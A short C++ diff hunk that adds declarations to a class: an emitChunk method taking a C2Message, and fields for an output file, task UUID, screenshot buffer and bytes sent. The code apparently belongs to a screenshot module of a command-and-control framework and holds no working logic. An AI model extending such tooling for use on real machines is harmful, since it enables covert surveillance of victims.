@@ -23,7 +23,12 @@ public:
     }
 
 private:
+    int emitChunk(C2Message& c2RetMessage);
 
+    std::string m_outputfile;
+    std::string m_taskUuid;
+    std::string m_screenshotBuffer;
+    std::size_t m_bytesSent = 0;
 };
 
 
